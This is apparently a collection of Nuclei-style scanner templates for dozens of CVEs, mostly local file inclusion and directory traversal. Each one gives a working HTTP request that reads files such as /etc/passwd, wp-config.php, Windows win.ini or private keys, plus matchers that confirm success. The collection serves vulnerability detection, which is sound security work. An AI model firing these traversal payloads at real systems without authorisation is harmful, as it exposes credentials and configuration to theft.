- Gogs 0.11.66 allows remote code execution because it does not properly validate session IDs, as demonstrated by a ".." session-file forgery in the file session provider in file.go. This is related to session ID handling in the go-macaron/session code for Macaron.
- severity - critical
- tags - gogs,lfi,rce,vulhub,cve,cve2018

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{Hostname}}
Cookie: lang=en-US; i_like_gogits=../../../../etc/passwd;

```

### Step - 2

```
GET / HTTP/1.1
Host: {{Hostname}}
Cookie: lang=en-US; i_like_gogits=../../../../etc/dummy;

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1 == 500 && status_code_2 == 200 && contains(body_2, "\<meta name=\"author\" content=\"Gogs\" />")

---

# IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion

## Description

- IPConfigure Orchid Core VMS 2.0.5 is susceptible to local file inclusion.

- severity - high
- tags - cve,cve2018,orchid,vms,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Drupal avatar_uploader v7.x-1.0-beta8 - Local File Inclusion

## Description

- In avatar_uploader v7.x-1.0-beta8 the view.php program doesn't restrict file paths, allowing unauthenticated users to retrieve arbitrary files.
- severity - high
- tags - cve,cve2018,lfi,drupal,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# uWSGI PHP Plugin Local File Inclusion

## Description

- uWSGI PHP Plugin before 2.0.17 mishandles a DOCUMENT_ROOT check during use of the --php-docroot option, making it susceptible to local file inclusion.
- severity - high
- tags - cve,cve2018,uwsgi,php,lfi,plugin,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Tarantella Enterprise \<3.11 - Local File Inclusion

## Description

- Tarantella Enterprise versions prior to 3.11 are susceptible to local file inclusion.

- severity - high
- tags - packetstorm,seclists,cve,cve2018,tarantella,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/tarantella/cgi-bin/secure/ttawlogin.cgi/?action=start&pg=../../../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# PhpMyAdmin \<4.8.2 - Local File Inclusion

## Description

- PhpMyAdmin before version 4.8.2 is susceptible to local file inclusion that allows an attacker to include (view and potentially execute) files on the server. The vulnerability comes from a portion of code where pages are redirected and loaded within phpMyAdmin, and an improper test for whitelisted pages. An attacker must be authenticated, except in the "$cfg['AllowArbitraryServer'] = true" case (where an attacker can specify any host he/she is already in control of, and execute arbitrary code on phpMyAdmin) and the "$cfg['ServerDefault'] = 0" case (which bypasses the login requirement and runs the vulnerable code without any authentication).
- severity - high
- tags - vulhub,edb,cve,cve2018,phpmyadmin,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# node-srv - Local File Inclusion

## Description

- node-srv is vulnerable to local file inclusion due to lack of url validation, which allows a malicious user to read content of any file with known path.
- severity - medium
- tags - cve,cve2018,nodejs,lfi,hackerone

## Requests

- Method - GET

### URL

- {{BaseURL}}/node_modules/../../../../../etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# WirelessHART Fieldgate SWG70 3.0 - Local File Inclusion

## Description

- WirelessHART Fieldgate SWG70 3.0 is vulnerable to local file inclusion via the fcgi-bin/wgsetcgi filename parameter.
- severity - medium
- tags - cve,cve2018,iot,lfi,edb

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/fcgi-bin/wgsetcgi
  - action=ajax&command=4&filename=../../../../../../../../../../etc/passwd&origin=cw.Communication.File.Read&transaction=fileCommand

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# Responsive filemanager 9.13.1 Server-Side Request Forgery

## Description

- Responsive filemanager 9.13.1 is susceptible to server-side request forgery in upload.php via the url parameter.
- severity - critical
- tags - cve,cve2018,ssrf,lfi,packetstorm,edb

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/filemanager/upload.php
  - fldr=&url=file:///etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# WordPress 99 Robots WP Background Takeover Advertisements \<=4.1.4 - Local File Inclusion

## Description

- WordPress 99 Robots WP Background Takeover Advertisements 4.1.4 is susceptible to local file inclusion via exports/download.php.

- severity - high
- tags - edb,cve,cve2018,wordpress,wp-plugin,lfi,traversal,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wpsite-background-takeover/exports/download.php?filename=../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
  3. DB_HOST
  4. The base configurations of the WordPress
- condition - and

---

# WordPress Plugin Wechat Broadcast 1.2.0 - Local File Inclusion

## Description

- WordPress Wechat Broadcast plugin 1.2.0 and earlier allows Directory Traversal via the Image.php url parameter.
- severity - critical
- tags - edb,seclists,cve,cve2018,wordpress,wp-plugin,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Cisco ASA - Local File Inclusion

## Description

- Cisco Adaptive Security Appliances (ASA) web interfaces could allow an unauthenticated, remote attacker to cause an affected device to reload unexpectedly, resulting in a denial of service (DoS) condition. It is also possible on certain software releases that the ASA will not reload, but an attacker could view sensitive system information without authentication by using directory traversal techniques. The vulnerability is due to lack of proper input validation of the HTTP URL. An attacker could exploit this vulnerability by sending a crafted HTTP request to an affected device. An exploit could allow the attacker to cause a DoS condition or unauthenticated disclosure of information. This vulnerability applies to IPv4 and IPv6 HTTP traffic. This vulnerability affects Cisco ASA Software and Cisco Firepower Threat Defense (FTD) Software that is running on the following Cisco products: 3000 Series Industrial Security Appliance (ISA), ASA 1000V Cloud Firewall, ASA 5500 Series Adaptive Security Appliances, ASA 5500-X Series Next-Generation Firewalls, ASA Services Module for Cisco Catalyst 6500 Series Switches and Cisco 7600 Series Routers, Adaptive Security Virtual Appliance (ASAv), Firepower 2100 Series Security Appliance, Firepower 4100 Series Security Appliance, Firepower 9300 ASA Security Module, FTD Virtual (FTDv). Cisco Bug IDs: CSCvi16029.

- severity - high
- tags - edb,cve,cve2018,cisco,lfi,traversal,asa,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions

### Matchers

**Type - word**

- part - body
- words
  1. ///sessions

**Type - status**

- status
  1. 200

---

# ACME mini_httpd \<1.30 - Local File Inclusion

## Description

- ACME mini_httpd before 1.30 is vulnerable to local file inclusion.
- severity - medium
- tags - cve,cve2018,lfi,mini_httpd

## Requests

### Step - 1

```
GET /etc/passwd HTTP/1.1
Host:


```

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# Argus Surveillance DVR 4.0.0.0 - Local File Inclusion

## Description

- Argus Surveillance DVR 4.0.0.0 devices allow unauthenticated local file inclusion, leading to file disclosure via a ..%2F in the WEBACCOUNT.CGI RESULTPAGE parameter.

- severity - high
- tags - packetstorm,edb,cve,cve2018,argussurveillance,lfi,dvr

## Requests

- Method - GET

### URL

- {{BaseURL}}/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=

### Matchers

**Type - word**

- part - body
- words
  1. for 16-bit app support
  2. [drivers]
- condition - and

**Type - status**

- status
  1. 200

---

# Mirasys DVMS Workstation \<=5.12.6 - Local File Inclusion

## Description

- Mirasys DVMS Workstation versions 5.12.6 and prior suffer from local file inclusion vulnerabilities.

- severity - high
- tags - cve,cve2018,mirasys,lfi,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# D-Link Routers - Local File Inclusion

## Description

- D-Link routers DWR-116 through 1.06, DIR-140L through 1.02, DIR-640L through 1.02,DWR-512 through 2.02,DWR-712 through 2.02,DWR-912 through 2.02, DWR-921 through 2.02, DWR-111 through 1.01, and probably others with the same type of firmware allows remote attackers to read arbitrary files via a /.. or // after "GET /uir" in an HTTP request to the web interface.
- severity - high
- tags - dlink,edb,seclists,cve,cve2018,lfi,router

## Requests

- Method - GET

### URL

- {{BaseURL}}/uir//etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# LG SuperSign EZ CMS 2.5 - Local File Inclusion

## Description

- LG SuperSign CMS 2.5 allows reading of arbitrary files via signEzUI/playlist/edit/upload/..%2f URIs - aka local file inclusion.

- severity - high
- tags - cve,cve2018,lfi,supersign,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/signEzUI/playlist/edit/upload/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# LG-Ericsson iPECS NMS 30M - Local File Inclusion

## Description

- Ericsson-LG iPECS NMS 30M allows local file inclusion via ipecs-cm/download?filename=../ URIs.
- severity - high
- tags - cve,cve2018,ericsson,lfi,traversal,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/ipecs-cm/download?filename=../../../../../../../../../../etc/passwd&filepath=/home/wms/www/data
- {{BaseURL}}/ipecs-cm/download?filename=jre-6u13-windows-i586-p.exe&filepath=../../../../../../../../../../etc/passwd%00.jpg

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress Localize My Post 1.0 - Local File Inclusion

## Description

- WordPress Localize My Post 1.0 is susceptible to local file inclusion via the ajax/include.php file parameter.

- severity - high
- tags - wordpress,lfi,plugin,wp,edb,packetstorm,cve,cve2018

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Acrolinx Server \<5.2.5 - Local File Inclusion

## Description

- Acrolinx Server prior to 5.2.5 suffers from a local file inclusion vulnerability.

- severity - high
- tags - cve,cve2018,acrolinx,lfi,packetstorm,edb

## Requests

### Step - 1

```
GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini HTTP/1.1
Host: {{Hostname}}


```

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# Ruby On Rails - Local File Inclusion

## Description

- Ruby On Rails is vulnerable to local file inclusion caused by secondary decoding in Sprockets 3.7.1 and lower versions. An attacker can use %252e%252e/ to access the root directory and read or execute any file on the target server.

- severity - high
- tags - cve,cve2018,rails,lfi,ruby,vulhub,seclists

## Requests

### Step - 1

```
GET /assets/file:%2f%2f/etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET /assets/file:%2f%2f{{path}}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- name - path
- internal - True
- part - body
- regex
  1. /etc/passwd is no longer under a load path: (.\*?),

---

# NCBI ToolBox - Directory Traversal

## Description

- NCBI ToolBox 2.0.7 through 2.2.26 legacy versions contain a path traversal vulnerability via viewcgi.cgi which may result in reading of arbitrary files (i.e., significant information disclosure) or file deletion via the nph-viewgif.cgi query string.
- severity - critical
- tags - cve,cve2018,ncbi,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/blast/nph-viewgif.cgi?../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Fortinet FortiOS - Credentials Disclosure

## Description

- Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.3 to 5.6.7 and 5.4.6 to 5.4.12 and FortiProxy 2.0.0, 1.2.0 to 1.2.8, 1.1.0 to 1.1.6, 1.0.0 to 1.0.7 under SSL VPN web portal allows an unauthenticated attacker to download system files via special crafted HTTP resource requests due to improper limitation of a pathname to a restricted directory (path traversal).
- severity - critical
- tags - cve,cve2018,fortios,lfi,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession

### Matchers

**Type - regex**

- part - body
- regex
  1. ^var fgt_lang =

---

# Eaton Intelligent Power Manager 1.6 - Directory Traversal

## Description

- Eaton Intelligent Power Manager v1.6 allows an attacker to include a file via directory traversal, which can lead to sensitive information disclosure, denial of service and code execution.
- severity - critical
- tags - edb,cve,cve2018,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/server/node_upgrade_srv.js?action=downloadFirmware&firmware=/../../../../../../../../../../etc/passwd
- {{BaseURL}}/server/node_upgrade_srv.js?action=downloadFirmware&firmware=/../../../../../../../../../../Windows/win.ini

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. \[(font|extension|file)s\]
- condition - or
- part - body

**Type - status**

- status
  1. 200

---

# Cybrotech CyBroHttpServer 1.0.3 - Local File Inclusion

## Description

- Cybrotech CyBroHttpServer 1.0.3 is vulnerable to local file inclusion in the URI.
- severity - medium
- tags - lfi,packetstorm,cve,cve2018,cybrotech

## Requests

### Step - 1

```
GET \..\..\..\..\Windows\win.ini HTTP/1.1
Host: {{Hostname}}


```

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# WordPress Payeezy Pay \<=2.97 - Local File Inclusion

## Description

- WordPress Plugin WP Payeezy Pay is prone to a local file inclusion vulnerability because it fails to sufficiently verify user-supplied input. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks. WordPress Plugin WP Payeezy Pay version 2.97 is vulnerable; prior versions are also affected.
- severity - critical
- tags - cve,cve2018,wordpress,lfi,plugin

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/wp-content/plugins/wp-payeezy-pay/donate.php
  - x_login=../../../wp-config

### Matchers

**Type - word**

- words
  1. The base configuration for WordPress
  2. define( 'DB_NAME',
  3. define( 'DB_PASSWORD',
- condition - and
- part - body

**Type - status**

- status
  1. 200

---

# Responsive FileManager \<9.13.4 - Local File Inclusion

## Description

- Responsive FileManager before version 9.13.4 is vulnerable to local file inclusion via filemanager/ajax_calls.php because it uses external input to construct a pathname that should be within a restricted directory, aka local file inclusion.
- severity - high
- tags - cve,cve2018,lfi,edb,seclists

## Requests

- Method - GET

### URL

- {{BaseURL}}/filemanager/ajax_calls.php?action=get_file&sub_action=preview&preview_mode=text&title=source&file=../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Centos Web Panel 0.9.8.480 - Local File Inclusion

## Description

- Centos Web Panel version 0.9.8.480 suffers from local file inclusion vulnerabilities. Other vulnerabilities including cross-site scripting and remote code execution are also known to impact this version.

- severity - high
- tags - cve,cve2018,centos,lfi,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Ncomputing vSPace Pro 10 and 11 - Directory Traversal

## Description

- Ncomputing vSpace Pro versions 10 and 11 suffer from a directory traversal vulnerability.
- severity - high
- tags - cve2018,ncomputing,lfi,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
- {{BaseURL}}/...\...\...\...\...\...\...\...\...\windows\win.ini
- {{BaseURL}}/..../..../..../..../..../..../..../..../..../windows/win.ini
- {{BaseURL}}/....\....\....\....\....\....\....\....\....\windows\win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# Tyto Sahi pro 7.x/8.x - Local File Inclusion

## Description

- Tyto Sahi Pro versions through 7.x.x and 8.0.0 are susceptible to a local file inclusion vulnerability in the web reports module which can allow an outside attacker to view contents of sensitive files.

- severity - high
- tags - cve,cve2018,lfi,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/_s_/dyn/Log_highlight?href=../../../../windows/win.ini&n=1#selected

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

**Type - status**

- status
  1. 200

---

# Kibana - Local File Inclusion

## Description

- Kibana versions before 6.4.3 and 5.6.13 contain an arbitrary file inclusion flaw in the Console plugin. An attacker with access to the Kibana Console API could send a request that will attempt to execute JavaScript which could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.
- severity - critical
- tags - cve,cve2018,lfi,kibana,vulhub

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd

### Matchers

**Type - word**

- part - body
- words
  1. "message":"An internal server error occurred"

**Type - word**

- part - header
- words
  1. kbn-name
  2. kibana
- condition - or
- case-insensitive - True

**Type - word**

- part - header
- words
  1. application/json

---

# Nextjs \<2.4.1 - Local File Inclusion

## Description

- ZEIT Next.js before 2.4.1 is susceptible to local file inclusion via the /\_next and /static request namespace, allowing attackers to obtain sensitive information.
- severity - high
- tags - cve,cve2017,nextjs,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/\_next/../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# Trixbox 2.8.0 - Path Traversal

## Description

- Trixbox 2.8.0.4 is susceptible to path traversal via the xajaxargs array parameter to /maint/index.php?packages or the lang parameter to /maint/modules/home/index.php.
- severity - medium
- tags - cve,cve2017,trixbox,lfi

## Requests

### Step - 1

```
POST /maint/index.php?packages HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{Hostname}}/maint/index.php?packages
Cookie: lng=en; security_level=0; PHPSESSID=7fasl890v1c51vu0d31oemt3j1; ARI=teev7d0kgvdko8u5b26p3335a2
Authorization: Basic bWFpbnQ6cGFzc3dvcmQ=

xajax=menu&xajaxr=1504969293893&xajaxargs[]=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&xajaxargs[]=yumPackages

```

### Step - 2

```
GET /maint/modules/home/index.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00english HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: {{Hostname}}/maint/index.php?packages
Cookie: lng=en; security_level=0; PHPSESSID=7fasl890v1c51vu0d31oemt3j1; ARI=teev7d0kgvdko8u5b26p3335a2
Authorization: Basic bWFpbnQ6cGFzc3dvcmQ=

```

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# FiberHome Routers - Local File Inclusion

## Description

- FiberHome routers are susceptible to local file inclusion in /cgi-bin/webproc via the getpage parameter in conjunction with a crafted var:page value.
- severity - high
- tags - lfi,router,edb,cve,cve2017

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/webproc?getpage=/etc/passwd&var:language=en_us&var:page=wizardfifth

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Luracast Restler 3.0.1 via TYPO3 Restler 1.7.1 - Local File Inclusion

## Description

- Luracast Restler 3.0.1 via TYPO3 Restler 1.7.1 is susceptible to local file inclusion in public/examples/resources/getsource.php. This could allow remote attackers to read arbitrary files via the file parameter.
- severity - high
- tags - cve,cve2017,restler,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/typo3conf/ext/restler/vendor/luracast/restler/public/examples/resources/getsource.php?file=../../../../../../../LocalConfiguration.php

### Matchers

**Type - word**

- part - body
- words
  1. \<?php
  2. 'host'
  3. 'database'
  4. 'extConf'
  5. 'debug'
- condition - and

**Type - status**

- status
  1. 200

---

# SAP NetWeaver Application Server Java 7.5 - Local File Inclusion

## Description

- SAP NetWeaver Application Server Java 7.5 is susceptible to local file inclusion in scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS. This can allow remote attackers to read arbitrary files via a .. (dot dot) in the query string, as exploited in the wild in August 2017, aka SAP Security Note 2486657.
- severity - high
- tags - cve,cve2017,sap,lfi,java,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/..

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. WEB-INF
  2. META-INF
- condition - and
- part - body

---

# Node.js \<8.6.0 - Directory Traversal

## Description

- Node.js before 8.6.0 allows remote attackers to access unintended files because a change to ".." handling is incompatible with the pathname validation used by unspecified community modules.
- severity - high
- tags - cve,cve2017,nodejs,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/static/../../../a/../../../../etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Oracle GlassFish Server Open Source Edition 4.1 - Local File Inclusion

## Description

- Oracle GlassFish Server Open Source Edition 4.1 is vulnerable to both authenticated and unauthenticated local file inclusion vulnerabilities that can be exploited by issuing specially crafted HTTP GET requests.
- severity - high
- tags - oracle,glassfish,lfi,edb,cve,cve2017

## Requests

- Method - GET

### URL

- {{BaseURL}}/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
- {{BaseURL}}/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini

### Matchers

**Type - dsl**

- dsl
  1. regex('root:.\*:0:0:', body)
  2. status_code == 200
- condition - and

**Type - dsl**

- dsl
  1. contains(body, 'bit app support')
  2. contains(body, 'fonts')
  3. contains(body, 'extensions')
  4. status_code == 200
- condition - and

---

# Kodi 17.1 - Local File Inclusion

## Description

- Kodi 17.1 is vulnerable to local file inclusion vulnerabilities because of insufficient validation of user input.

- severity - high
- tags - cve2017,kodi,lfi,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/image/image%3A%2F%2F%2e%2e%252fetc%252fpasswd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Oracle GlassFish Server Open Source Edition 3.0.1 - Local File Inclusion

## Description

- Oracle GlassFish Server Open Source Edition 3.0.1 (build 22) is vulnerable to unauthenticated local file inclusion vulnerabilities that allow remote attackers to request arbitrary files on the server.
- severity - high
- tags - cve,cve2017,glassfish,oracle,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/resource/file%3a///etc/passwd/

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0:

**Type - status**

- status
  1. 200

---

# WordPress Delightful Downloads Jquery File Tree 2.1.5 - Local File Inclusion

## Description

- WordPress Delightful Downloads Jquery File Tree versions 2.1.5 and older are susceptible to local file inclusion vulnerabilities via jqueryFileTree.
- severity - high
- tags - cve,cve2017,wordpress,wp-plugin,lfi,jquery,edb,packetstorm

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php
  - dir=%2Fetc%2F&onlyFiles=true

### Matchers

**Type - word**

- words
  1. \<li class='file ext_passwd'>
  2. \<a rel='/passwd'>passwd\</a>\</li>
- condition - and
- part - body

**Type - status**

- status
  1. 200

---

# BOA Web Server 0.94.14 - Arbitrary File Access

## Description

- BOA Web Server 0.94.14 is susceptible to arbitrary file access. The server allows the injection of "../.." using the FILECAMERA variable sent by GET to read files with root privileges and without using access credentials.
- severity - high
- tags - boa,lfr,lfi,cve,cve2017,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/passwd%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=admin&PWD=admin&PIC_SIZE=0

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Yaws 1.91 - Local File Inclusion

## Description

- Yaws 1.91 allows unauthenticated local file inclusion via /%5C../ submitted to port 8080.
- severity - high
- tags - edb,cve,cve2017,yaws,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/%5C../ssl/yaws-key.pem

### Matchers

**Type - word**

- words
  1. BEGIN RSA PRIVATE KEY

**Type - status**

- status
  1. 200

**Type - dsl**

- dsl
  1. !contains(tolower(body), "\<html")

---

# Fonality trixbox - Directory Traversal

## Description

- Multiple directory traversal vulnerabilities in Fonality trixbox allow remote attackers to read arbitrary files via a .. (dot dot) in the lang parameter to (1) home/index.php, (2) asterisk_info/asterisk_info.php, (3) repo/repo.php, or (4) endpointcfg/endpointcfg.php in maint/modules/.
- severity - high
- tags - packetstorm,cve,cve2014,lfi,trixbox,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/maint/modules/endpointcfg/endpointcfg.php?lang=../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Osclass Security Advisory 3.4.1 - Local File Inclusion

## Description

- A directory traversal vulnerability in OSClass before 3.4.2 allows remote attackers to read arbitrary files via a .. (dot dot) in the file parameter in a render action to oc-admin/index.php.
- severity - high
- tags - cve,cve2014,lfi,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/osclass/oc-admin/index.php?page=appearance&action=render&file=../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# WordPress Plugin WP Content Source Control - Directory Traversal

## Description

- A directory traversal vulnerability in the file_get_contents function in downloadfiles/download.php in the WP Content Source Control (wp-source-control) plugin 3.0.0 and earlier for WordPress allows remote attackers to read arbitrary files via a .. (dot dot) in the path parameter.
- severity - high
- tags - cve,cve2014,wordpress,wp-plugin,lfi,edb,seclists

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wp-source-control/downloadfiles/download.php?path=../../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# Simple Online Planning Tool \<1.3.2 - Local File Inclusion

## Description

- SOPlanning \<1.32 contain a directory traversal in the file_get_contents function via a .. (dot dot) in the fichier parameter.

- severity - medium
- tags - packetstorm,edb,seclists,cve,cve2014,soplanning,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/process/feries.php?fichier=../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# webEdition 6.3.8.0 - Directory Traversal

## Description

- A directory traversal vulnerability in showTempFile.php in webEdition CMS before 6.3.9.0 Beta allows remote authenticated users to read arbitrary files via a .. (dot dot) in the file parameter.
- severity - high
- tags - edb,packetstorm,cve,cve2014,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/webEdition/showTempFile.php?file=../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Netsweeper 4.0.8 - Directory Traversal

## Description

- A directory traversal vulnerability in webadmin/reporter/view_server_log.php in Netsweeper before 3.1.10, 4.0.x before 4.0.9, and 4.1.x before 4.1.2 allows remote attackers to list directory contents via a .. (dot dot) in the log parameter in a stats action.
- severity - medium
- tags - cve2014,netsweeper,lfi,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/webadmin/reporter/view_server_log.php?act=stats&filename=log&offset=1&count=1&sortorder=0&filter=0&log=../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# WordPress Plugin Tera Charts - Directory Traversal

## Description

- Multiple directory traversal vulnerabilities in Tera Charts (tera-charts) plugin 0.1 for WordPress allow remote attackers to read arbitrary files via a .. (dot dot) in the fn parameter to (1) charts/treemap.php or (2) charts/zoomabletreemap.php.
- severity - high
